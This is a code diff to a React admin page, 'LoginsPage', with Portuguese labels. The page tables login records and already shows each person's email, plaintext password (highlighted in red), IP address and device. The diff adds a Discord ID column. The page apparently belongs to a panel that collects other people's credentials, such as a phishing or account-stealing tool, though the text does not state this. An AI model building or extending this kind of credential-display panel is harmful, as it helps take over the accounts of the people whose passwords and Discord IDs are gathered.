@@ -4,7 +4,7 @@ import { useState, useEffect } from "react"
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
 import { Input } from "@/components/ui/input"
 import { Button } from "@/components/ui/button"
-import { Search, Monitor, Smartphone, Globe, Trash2, RefreshCw, CheckCircle, XCircle } from "lucide-react"
+import { Search, Monitor, Smartphone, Globe, Trash2, RefreshCw, CheckCircle, XCircle, MessageCircle } from "lucide-react"
 
 interface LoginRecord {
   id: string
@@ -16,6 +16,7 @@ interface LoginRecord {
   deviceType: "desktop" | "mobile"
   date: string
   success: boolean
+  discordId?: string
 }
 
 interface Stats {
@@ -214,6 +215,7 @@ export default function LoginsPage() {
                     <th className="pb-3 text-left text-sm font-medium text-muted-foreground">Usuário</th>
                     <th className="pb-3 text-left text-sm font-medium text-muted-foreground">Email</th>
                     <th className="pb-3 text-left text-sm font-medium text-muted-foreground">Senha</th>
+                    <th className="pb-3 text-left text-sm font-medium text-muted-foreground">Discord ID</th>
                     <th className="pb-3 text-left text-sm font-medium text-muted-foreground">IP</th>
                     <th className="pb-3 text-left text-sm font-medium text-muted-foreground">Dispositivo</th>
                     <th className="pb-3 text-left text-sm font-medium text-muted-foreground">Data</th>
@@ -232,6 +234,16 @@ export default function LoginsPage() {
                       <td className="py-4 text-sm font-medium">{login.name}</td>
                       <td className="py-4 text-sm text-muted-foreground">{login.email}</td>
                       <td className="py-4 text-sm font-mono text-red-400">{login.password}</td>
+                      <td className="py-4 text-sm">
+                        {login.discordId ? (
+                          <div className="flex items-center gap-2 text-[#5865F2]">
+                            <MessageCircle className="h-4 w-4" />
+                            <span className="font-mono">{login.discordId}</span>
+                          </div>
+                        ) : (
+                          <span className="text-muted-foreground">-</span>
+                        )}
+                      </td>
                       <td className="py-4 text-sm">
                         <div className="flex items-center gap-2">
                           <Globe className="h-4 w-4 text-muted-foreground" />
